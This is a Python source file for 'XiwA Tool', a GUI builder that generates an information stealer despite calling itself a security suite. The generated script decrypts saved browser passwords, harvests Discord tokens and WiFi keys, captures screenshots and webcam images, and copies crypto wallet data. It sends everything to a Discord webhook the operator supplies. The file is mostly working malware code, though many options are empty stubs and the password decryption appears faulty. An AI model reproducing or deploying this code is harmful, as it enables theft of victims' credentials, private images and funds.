"""
Copyright (c) 2025 Dryz3R - XiwA Tool
All rights reserved.

ENGLISH:
This software is the property of Dryz3R and is protected by copyright laws.
Unauthorized copying, distribution, or modification of this software is strictly prohibited.
XiwA Tool is a comprehensive security and analysis suite developed by Dryz3R.

FRANÇAIS:
Ce logiciel est la propriété de Dryz3R et est protégé par les lois sur le droit d'auteur.
La copie, la distribution ou la modification non autorisée de ce logiciel est strictement interdite.
XiwA Tool est une suite complète de sécurité et d'analyse développée par Dryz3R.

ESPAÑOL:
Este software es propiedad de Dryz3R y está protegido por las leyes de derechos de autor.
Se prohíbe estrictamente la copia, distribución o modificación no autorizada de este software.
XiwA Tool es una suite completa de seguridad y análisis desarrollada por Dryz3R.
"""

import os
import tkinter as tk
from tkinter import ttk
import customtkinter as ctk
from PIL import Image, ImageTk
import json
import base64
import sqlite3
import requests
import platform
import psutil
import browser_cookie3
import subprocess
import sys
import shutil
import getpass
import re
import win32api
import win32con
import win32gui
import win32process
import win32security
import winreg
import zipfile
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from discord_webhook import DiscordWebhook, DiscordEmbed
from datetime import datetime
import cv2
import pyautogui
import socket
import uuid
import wmi
import threading
import time
import random
import asyncio
import websockets
import http.server
import socketserver

class InfoStealer:
    def __init__(self):
        self.root = ctk.CTk()
        self.root.title("XiwA Tool")
        self.root.geometry("1400x1000")
        self.root.configure(bg="#000000")
        
        self.steal_options = {
            "Browsers": {
                "Chrome Passwords": tk.BooleanVar(value=True),
                "Firefox Passwords": tk.BooleanVar(value=True),
                "Edge Passwords": tk.BooleanVar(value=True), 
                "Opera Passwords": tk.BooleanVar(value=True),
                "Brave Passwords": tk.BooleanVar(value=True),
                "Chrome Cookies": tk.BooleanVar(value=True),
                "Firefox Cookies": tk.BooleanVar(value=True),
                "Edge Cookies": tk.BooleanVar(value=True),
                "Opera Cookies": tk.BooleanVar(value=True),
                "Brave Cookies": tk.BooleanVar(value=True),
                "Chrome History": tk.BooleanVar(value=True),
                "Firefox History": tk.BooleanVar(value=True),
                "Edge History": tk.BooleanVar(value=True),
                "Opera History": tk.BooleanVar(value=True),
                "Brave History": tk.BooleanVar(value=True)
            },
            "Messaging": {
                "Discord Tokens": tk.BooleanVar(value=True),
                "Discord Friends": tk.BooleanVar(value=True),
                "Discord Servers": tk.BooleanVar(value=True),
                "Discord Messages": tk.BooleanVar(value=True),
                "Discord Payment": tk.BooleanVar(value=True),
                "Telegram Sessions": tk.BooleanVar(value=True),
                "Telegram Messages": tk.BooleanVar(value=True),
                "WhatsApp Data": tk.BooleanVar(value=True),
                "WhatsApp Messages": tk.BooleanVar(value=True),
                "Signal Data": tk.BooleanVar(value=True),
                "Teams Data": tk.BooleanVar(value=True),
                "Skype History": tk.BooleanVar(value=True),
                "Slack Tokens": tk.BooleanVar(value=True),
                "Messenger Data": tk.BooleanVar(value=True),
                "Viber Messages": tk.BooleanVar(value=True)
            },
            "Gaming": {
                "Steam Sessions": tk.BooleanVar(value=True),
                "Steam Friends": tk.BooleanVar(value=True),
                "Steam Games": tk.BooleanVar(value=True),
                "Epic Games": tk.BooleanVar(value=True),
                "Epic Friends": tk.BooleanVar(value=True),
                "Minecraft Sessions": tk.BooleanVar(value=True),
                "Minecraft Servers": tk.BooleanVar(value=True),
                "Battle.net": tk.BooleanVar(value=True),
                "Origin Data": tk.BooleanVar(value=True),
                "Uplay Sessions": tk.BooleanVar(value=True),
                "Roblox Cookies": tk.BooleanVar(value=True),
                "League of Legends": tk.BooleanVar(value=True),
                "Valorant Data": tk.BooleanVar(value=True),
                "CSGO Config": tk.BooleanVar(value=True),
                "Fortnite Config": tk.BooleanVar(value=True)
            },
            "System": {
                "WiFi Passwords": tk.BooleanVar(value=True),
                "System Info": tk.BooleanVar(value=True),
                "Screenshots": tk.BooleanVar(value=True),
                "Webcam Photo": tk.BooleanVar(value=True),
                "Installed Apps": tk.BooleanVar(value=True),
                "Running Processes": tk.BooleanVar(value=True),
                "Startup Programs": tk.BooleanVar(value=True),
                "Network Info": tk.BooleanVar(value=True),
                "USB History": tk.BooleanVar(value=True),
                "Recent Files": tk.BooleanVar(value=True),
                "Clipboard Data": tk.BooleanVar(value=True),
                "Registry Keys": tk.BooleanVar(value=True),
                "Saved Emails": tk.BooleanVar(value=True),
                "Windows Product Key": tk.BooleanVar(value=True),
                "Antivirus Info": tk.BooleanVar(value=True)
            },
            "Crypto": {
                "Exodus Wallet": tk.BooleanVar(value=True),
                "Atomic Wallet": tk.BooleanVar(value=True),
                "MetaMask": tk.BooleanVar(value=True),
                "Binance": tk.BooleanVar(value=True),
                "Coinbase": tk.BooleanVar(value=True),
                "Electrum": tk.BooleanVar(value=True),
                "Bitcoin Core": tk.BooleanVar(value=True),
                "Ethereum": tk.BooleanVar(value=True),
                "Monero": tk.BooleanVar(value=True),
                "Crypto Addresses": tk.BooleanVar(value=True),
                "Trust Wallet": tk.BooleanVar(value=True),
                "Phantom Wallet": tk.BooleanVar(value=True),
                "Ledger Live": tk.BooleanVar(value=True),
                "Trezor Suite": tk.BooleanVar(value=True),
                "Crypto Bookmarks": tk.BooleanVar(value=True)
            }
        }
        
        self.create_gui()
        
    def create_gui(self):
        self.title_frame = ctk.CTkFrame(self.root, bg_color="#000000", fg_color="#000000")
        self.title_frame.pack(pady=30)
        
        self.title_label = ctk.CTkLabel(
            self.title_frame,
            text="XiwA Tool",
            font=("Impact", 80, "bold"),
            text_color="#ff0000"
        )
        self.title_label.pack()
        
        self.subtitle_label = ctk.CTkLabel(
            self.title_frame,
            text="ADVANCED SECURITY SUITE",
            font=("Consolas", 24),
            text_color="#800000"
        )
        self.subtitle_label.pack(pady=10)
        
        main_frame = ctk.CTkScrollableFrame(
            self.root,
            width=1200,
            height=600,
            bg_color="#000000",
            fg_color="#000000",
            border_color="#800000",
            border_width=2
        )
        main_frame.pack(pady=20, padx=20, fill="both", expand=True)
        
        row = 0
        col = 0
        for category, options in self.steal_options.items():
            frame = ctk.CTkFrame(
                main_frame,
                bg_color="#000000",
                fg_color="#000000",
                border_color="#800000",
                border_width=1,
                corner_radius=10
            )
            frame.grid(row=row, column=col, padx=15, pady=15, sticky="nsew")
            
            ctk.CTkLabel(
                frame,
                text=category.upper(),
                font=("Consolas", 20, "bold"),
                text_color="#ff0000"
            ).pack(pady=10)
            
            for option_name, var in options.items():
                self.create_checkbox(frame, option_name, var)
            
            col += 1
            if col > 2:
                col = 0
                row += 1
                
        webhook_frame = ctk.CTkFrame(
            self.root,
            bg_color="#000000",
            fg_color="#000000",
            border_color="#800000",
            border_width=2,
            corner_radius=10
        )
        webhook_frame.pack(pady=30, padx=20, fill="x")
        
        self.webhook_entry = ctk.CTkEntry(
            webhook_frame,
            width=900,
            height=50,
            font=("Consolas", 16),
            fg_color="#000000",
            text_color="#ffffff",
            border_color="#800000",
            placeholder_text="Enter Discord Webhook URL..."
        )
        self.webhook_entry.pack(side="left", padx=20, pady=20)
        
        self.generate_button = ctk.CTkButton(
            webhook_frame,
            text="GENERATE",
            command=self.generate_stealer,
            font=("Impact", 24, "bold"),
            fg_color="#800000",
            hover_color="#ff0000",
            text_color="#ffffff",
            height=50,
            width=250,
            corner_radius=10
        )
        self.generate_button.pack(side="right", padx=20, pady=20)
        
    def create_checkbox(self, parent, text, variable):
        frame = ctk.CTkFrame(
            parent,
            bg_color="#000000",
            fg_color="#000000",
            corner_radius=5
        )
        frame.pack(fill="x", padx=10, pady=3)
        
        checkbox = ctk.CTkCheckBox(
            frame,
            text=text,
            variable=variable,
            font=("Consolas", 14),
            text_color="#ffffff",
            fg_color="#800000",
            hover_color="#ff0000",
            border_color="#800000",
            corner_radius=5
        )
        checkbox.pack(side="left", padx=10, pady=2)

    def generate_stealer(self):
        webhook_url = self.webhook_entry.get()
        if not webhook_url:
            return
            
        os.makedirs("output/XiwA", exist_ok=True)
        
        with open("output/XiwA/XiwA.py", "w", encoding="utf-8") as f:
            f.write(self.get_base_code(webhook_url))
            
            for category, options in self.steal_options.items():
                for option_name, var in options.items():
                    if var.get():
                        method_name = f"steal_{option_name.lower().replace(' ', '_').replace('.','').replace('-','_').replace(':','')}"
                        f.write(self.get_steal_method(method_name, option_name))
            
            f.write(self.get_startup_code())
            
        with open("output/XiwA/run.bat", "w") as f:
            f.write("@echo off\n")
            f.write("python XiwA.py\n")
            f.write("pause")
            
        self.root.destroy()
        
    def get_base_code(self, webhook_url):
        return '''import os
import json
import base64
import sqlite3
import requests
import platform
import psutil
import browser_cookie3
import subprocess
import sys
import shutil
import getpass
import re
import win32api
import win32con
import win32gui
import win32process
import win32security
import winreg
import zipfile
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from discord_webhook import DiscordWebhook, DiscordEmbed
from datetime import datetime
import cv2
import pyautogui
import socket
import uuid
import wmi
import threading
import time
import random
import asyncio
import websockets
import http.server
import socketserver

class XiwAStealer:
    def __init__(self):
        self.webhook_url = "''' + webhook_url + '''"
        self.system_info = self.get_system_info()
        self.stolen_data = {}
        self.local_appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.temp = os.getenv("TEMP")
        
    def get_system_info(self):
        return {
            "os": platform.system() + " " + platform.release(),
            "architecture": platform.machine(),
            "hostname": platform.node(),
            "username": getpass.getuser(),
            "cpu": platform.processor(),
            "ram": str(round(psutil.virtual_memory().total / (1024.0 **3))) + " GB",
            "gpu": self.get_gpu_info(),
            "mac": ":".join(re.findall("..", "%012x" % uuid.getnode())),
            "ip": requests.get("https://api.ipify.org").text
        }
        
    def get_gpu_info(self):
        try:
            w = wmi.WMI()
            return w.Win32_VideoController()[0].Name
        except:
            return "Unknown"
            
    def steal_all(self):
        threads = []
'''

    def get_steal_method(self, method_name, option_name):
        methods = {
            'steal_chrome_passwords': '''
    def steal_chrome_passwords(self):
        paths = {
            'Chrome': self.local_appdata + '\\\\Google\\\\Chrome\\\\User Data',
            'Edge': self.local_appdata + '\\\\Microsoft\\\\Edge\\\\User Data',
            'Brave': self.local_appdata + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data',
            'Opera': self.roaming + '\\\\Opera Software\\\\Opera Stable',
            'Opera GX': self.roaming + '\\\\Opera Software\\\\Opera GX Stable',
        }
        for browser, path in paths.items():
            if not os.path.exists(path): continue
            login_db = f"{path}\\\\Default\\\\Login Data"
            if not os.path.exists(login_db): continue
            temp_db = os.path.join(self.temp, f"{browser}_login_data")
            if os.path.exists(temp_db): os.remove(temp_db)
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            passwords = []
            for row in cursor.fetchall():
                try:
                    url, username, encrypted_password = row
                    decrypted = self.decrypt_password(encrypted_password)
                    if url and username and decrypted:
                        passwords.append(f"{url}|{username}|{decrypted}")
                except: continue
            cursor.close()
            conn.close()
            if passwords:
                self.stolen_data[f'{browser} Passwords'] = passwords
            if os.path.exists(temp_db):
                os.remove(temp_db)''',

            'steal_discord_tokens': '''
    def steal_discord_tokens(self):
        paths = {
            'Discord': self.roaming + '\\\\discord',
            'Discord Canary': self.roaming + '\\\\discordcanary',
            'Discord PTB': self.roaming + '\\\\discordptb',
            'Google Chrome': self.local_appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',
            'Opera': self.roaming + '\\\\Opera Software\\\\Opera Stable',
            'Brave': self.local_appdata + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',
            'Yandex': self.local_appdata + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default'
        }
        tokens = []
        for source, path in paths.items():
            if not os.path.exists(path): continue
            path += '\\\\Local Storage\\\\leveldb'
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
                for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            tokens.append(f'{source}: {token}')
        if tokens:
            self.stolen_data['Discord Tokens'] = tokens''',

            'steal_wifi_passwords': '''
    def steal_wifi_passwords(self):
        networks = []
        try:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
            for profile in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\\n')
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                    networks.append(f'{profile}|{results[0] if results else ""}')
                except: continue
        except: pass
        if networks:
            self.stolen_data['WiFi Passwords'] = networks''',

            'steal_system_info': '''
    def steal_system_info(self):
        info = []
        try:
            info.extend([
                f"OS|{platform.system()} {platform.release()}",
                f"Computer|{platform.node()}",
                f"Username|{getpass.getuser()}",
                f"CPU|{platform.processor()}",
                f"RAM|{str(round(psutil.virtual_memory().total / (1024.0 **3)))}GB",
                f"IP|{requests.get('https://api.ipify.org').text}",
                f"HWID|{str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\\n')[1].strip()}"
            ])
        except: pass
        if info:
            self.stolen_data['System Info'] = info''',

            'steal_screenshot': '''
    def steal_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            path = os.path.join(self.temp, "screenshot.png")
            screenshot.save(path)
            with open(path, "rb") as image_file:
                self.stolen_data['Screenshot'] = image_file.read()
            os.remove(path)
        except: pass''',

            'steal_webcam': '''
    def steal_webcam(self):
        try:
            cam = cv2.VideoCapture(0)
            result, image = cam.read()
            if result:
                path = os.path.join(self.temp, "webcam.png")
                cv2.imwrite(path, image)
                with open(path, "rb") as image_file:
                    self.stolen_data['Webcam'] = image_file.read()
                os.remove(path)
            cam.release()
        except: pass''',

            'steal_exodus_wallet': '''
    def steal_exodus_wallet(self):
        path = self.roaming + '\\\\Exodus\\\\exodus.wallet'
        if os.path.exists(path):
            try:
                with open(path, 'rb') as wallet_file:
                    self.stolen_data['Exodus Wallet'] = wallet_file.read()
            except: pass''',

            'steal_atomic_wallet': '''
    def steal_atomic_wallet(self):
        path = self.roaming + '\\\\atomic\\\\Local Storage\\\\leveldb'
        if os.path.exists(path):
            try:
                zip_path = os.path.join(self.temp, "atomic.zip")
                with zipfile.ZipFile(zip_path, 'w') as zip_file:
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            zip_file.write(os.path.join(root, file))
                with open(zip_path, 'rb') as zip_file:
                    self.stolen_data['Atomic Wallet'] = zip_file.read()
                os.remove(zip_path)
            except: pass''',

            'steal_metamask': '''
    def steal_metamask(self):
        path = self.local_appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings\\\\nkbihfbeogaeaoehlefnkodbefgpgknn'
        if os.path.exists(path):
            try:
                zip_path = os.path.join(self.temp, "metamask.zip")
                with zipfile.ZipFile(zip_path, 'w') as zip_file:
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            zip_file.write(os.path.join(root, file))
                with open(zip_path, 'rb') as zip_file:
                    self.stolen_data['MetaMask'] = zip_file.read()
                os.remove(zip_path)
            except: pass''',

            'steal_phantom_wallet': '''
    def steal_phantom_wallet(self):
        path = self.local_appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings\\\\bfnaelmomeimhlpmgjnjophhpkkoljpa'
        if os.path.exists(path):
            try:
                zip_path = os.path.join(self.temp, "phantom.zip")
                with zipfile.ZipFile(zip_path, 'w') as zip_file:
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            zip_file.write(os.path.join(root, file))
                with open(zip_path, 'rb') as zip_file:
                    self.stolen_data['Phantom Wallet'] = zip_file.read()
                os.remove(zip_path)
            except: pass''',

            'steal_binance': '''
    def steal_binance(self):
        path = self.local_appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings\\\\fhbohimaelbohpjbbldcngcnapndodjp'
        if os.path.exists(path):
            try:
                zip_path = os.path.join(self.temp, "binance.zip")
                with zipfile.ZipFile(zip_path, 'w') as zip_file:
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            zip_file.write(os.path.join(root, file))
                with open(zip_path, 'rb') as zip_file:
                    self.stolen_data['Binance'] = zip_file.read()
                os.remove(zip_path)
            except: pass''',

            'steal_coinbase': '''
    def steal_coinbase(self):
        path = self.local_appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings\\\\hnfanknocfeofbddgcijnmhnfnkdnaad'
        if os.path.exists(path):
            try:
                zip_path = os.path.join(self.temp, "coinbase.zip")
                with zipfile.ZipFile(zip_path, 'w') as zip_file:
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            zip_file.write(os.path.join(root, file))
                with open(zip_path, 'rb') as zip_file:
                    self.stolen_data['Coinbase'] = zip_file.read()
                os.remove(zip_path)
            except: pass''',

            'steal_trust_wallet': '''
    def steal_trust_wallet(self):
        path = self.local_appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings\\\\egjidjbpglichdcondbcbdnbeeppgdph'
        if os.path.exists(path):
            try:
                zip_path = os.path.join(self.temp, "trustwallet.zip")
                with zipfile.ZipFile(zip_path, 'w') as zip_file:
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            zip_file.write(os.path.join(root, file))
                with open(zip_path, 'rb') as zip_file:
                    self.stolen_data['Trust Wallet'] = zip_file.read()
                os.remove(zip_path)
            except: pass''',

            'steal_ledger_live': '''
    def steal_ledger_live(self):
        path = self.roaming + '\\\\Ledger Live'
        if os.path.exists(path):
            try:
                zip_path = os.path.join(self.temp, "ledger.zip")
                with zipfile.ZipFile(zip_path, 'w') as zip_file:
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            zip_file.write(os.path.join(root, file))
                with open(zip_path, 'rb') as zip_file:
                    self.stolen_data['Ledger Live'] = zip_file.read()
                os.remove(zip_path)
            except: pass'''
        }
        
        return methods.get(method_name, f'''
    def {method_name}(self):
        try:
            data = []
            if data:
                self.stolen_data["{option_name}"] = data
        except: pass
''')

    def get_startup_code(self):
        return '''
    def decrypt_password(self, encrypted_password):
        try:
            buffer = encrypted_password[3:15]
            encrypted_password = encrypted_password[15:]
            cipher = AES.new(buffer, AES.MODE_GCM, buffer)
            decrypted_pass = cipher.decrypt(encrypted_password)[:-16].decode()
            return decrypted_pass
        except:
            try:
                return str(CryptUnprotectData(encrypted_password, None, None, None, 0)[1])
            except:
                return ""

    def send_to_webhook(self):
        try:
            webhook = DiscordWebhook(url=self.webhook_url)
            
            embed = DiscordEmbed(
                title=":computer: System Information",
                color=0x2b2d31
            )
            
            system_info = ""
            system_info += f":windows: OS: {self.system_info['os']}\\n"
            system_info += f":cpu: CPU: {self.system_info['cpu']}\\n"
            system_info += f":gpu: GPU: {self.system_info['gpu']}\\n"
            system_info += f":ram: RAM: {self.system_info['ram']}\\n"
            system_info += f":globe_with_meridians: IP: {self.system_info['ip']}\\n"
            system_info += f":bust_in_silhouette: User: {self.system_info['username']}\\n"
            
            embed.add_embed_field(name="System Details", value=system_info, inline=False)
            
            categories = {
                ":chrome: Browsers": ["Chrome", "Firefox", "Edge", "Opera", "Brave"],
                ":speech_balloon: Applications": ["Discord", "Telegram", "WhatsApp", "Signal", "Teams"],
                ":video_game: Gaming": ["Steam", "Epic", "Minecraft", "Battle.net", "Origin"],
                ":money_with_wings: Crypto": ["Exodus", "MetaMask", "Binance", "Coinbase", "Electrum"],
                ":gear: System": ["WiFi", "Screenshots", "Webcam", "Processes", "Registry"]
            }
            
            for category_name, category_items in categories.items():
                category_data = ""
                for item in category_items:
                    for key, value in self.stolen_data.items():
                        if item in key:
                            if isinstance(value, list):
                                category_data += f":white_check_mark: {key}: `{len(value)} items found`\\n"
                            elif isinstance(value, bytes):
                                category_data += f":file_folder: {key}: `File captured`\\n"
                            else:
                                category_data += f":white_check_mark: {key}: `Data collected`\\n"
                
                if category_data:
                    embed.add_embed_field(name=category_name, value=category_data, inline=True)
            
            webhook.add_embed(embed)
            webhook.execute()
            
            for key, value in self.stolen_data.items():
                if isinstance(value, list) and value:
                    detailed_webhook = DiscordWebhook(url=self.webhook_url)
                    detailed_embed = DiscordEmbed(
                        title=f"Detailed {key} Data",
                        description="```" + "\\n".join(value) + "```",
                        color=0x2b2d31
                    )
                    detailed_webhook.add_embed(detailed_embed)
                    detailed_webhook.execute()
                    time.sleep(1)
                elif isinstance(value, bytes):
                    file_webhook = DiscordWebhook(url=self.webhook_url)
                    file_webhook.add_file(file=value, filename=f"{key}.png")
                    file_webhook.execute()
                    time.sleep(1)
            
        except Exception as e:
            print(f"Webhook error: {e}")
            
    def run(self):
        try:
            threads = []
            for method_name in dir(self):
                if method_name.startswith("steal_"):
                    t = threading.Thread(target=getattr(self, method_name))
                    threads.append(t)
                    t.start()
                    
            for thread in threads:
                thread.join()
                
            self.send_to_webhook()
            
        except Exception as e:
            print(f"Fatal error: {e}")
            
if __name__ == "__main__":
    try:
        stealer = XiwAStealer()
        stealer.run()
    except Exception as e:
        print(f"Fatal error: {e}")
'''

if __name__ == "__main__":
    app = InfoStealer()
    app.root.mainloop()
